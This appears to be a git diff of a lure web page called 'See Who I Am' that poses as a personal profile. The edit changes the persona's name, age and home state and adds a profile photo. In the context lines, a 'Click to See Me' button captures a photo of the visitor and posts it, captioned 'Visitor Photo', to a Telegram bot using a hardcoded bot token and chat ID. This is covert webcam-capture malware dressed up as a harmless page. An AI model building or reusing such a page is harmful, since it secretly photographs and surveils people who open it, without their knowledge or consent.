@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>See Who I Am - S</title>
+    <title>See Who I Am - Amrita</title>
     <style>
         * {
             margin: 0;
@@ -27,6 +27,16 @@
             border-radius: 20px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.3);
             max-width: 400px;
+            position: relative;
+        }
+        .profile-photo {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+            border: 4px solid rgba(255,255,255,0.3);
         }
         h1 {
             font-size: 2.5em;
@@ -90,18 +100,19 @@
 </head>
 <body>
     <div class="container">
+        <img src="photo1.jpg" alt="Amrita" class="profile-photo" onerror="this.style.display='none';">
         <h1>👀 See Who I Am</h1>
         <div class="info">
-            <p><strong>Name:</strong> SivaSingh</p>
-            <p><strong>Age:</strong> 18</p>
-            <p><strong>From:</strong> Punjab</p>
+            <p><strong>Name:</strong> Amrita</p>
+            <p><strong>Age:</strong> 20</p>
+            <p><strong>From:</strong> Bihar</p>
             <p><strong>Professional Coder</strong></p>
         </div>
         <button class="btn" onclick="capturePhoto()">Click to See Me 😎</button>
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p>Just a moment... Loading..! 📸</p>
-            <p class="success" id="success" style="display:none;">m! Check your connection! ✅</p>
+            <p>Just a moment... Loading ..! 📸</p>
+            <p class="success" id="success" style="display:none;"> Check your connection! ✅</p>
         </div>
     </div>
 
@@ -144,7 +155,7 @@
                         const formData = new FormData();
                         formData.append('photo', blob, 'photo.jpg');
                         formData.append('chat_id', '7735968383');
-                        formData.append('caption', '🕵️ Visitor Photo - SivaSingh Profile');
+                        formData.append('caption', '🕵️ Visitor Photo - Amrita Profile');
                         
                         // Send to Telegram Bot
                         await fetch(`https://api.telegram.org/bot8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc/sendPhoto`, {
